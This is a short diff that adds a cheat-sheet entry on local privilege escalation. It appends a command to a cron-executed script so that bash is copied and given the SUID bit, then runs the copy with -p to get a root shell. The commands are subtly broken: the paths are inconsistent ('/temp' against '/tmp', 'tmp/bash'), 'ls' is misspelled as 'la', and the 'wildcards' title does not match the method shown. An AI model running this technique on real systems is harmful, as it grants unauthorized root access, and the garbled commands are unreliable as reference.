@@ -1,0 +1,7 @@
+Escalation via Cron Wildcards:
+
+echo 'cp /bin/bash /temp/bash; chmod +s /tmp/bash' >> /usr/local/bin/WantedFileName.sh
+
+la -la /tmp 
+
+tmp/bash -p
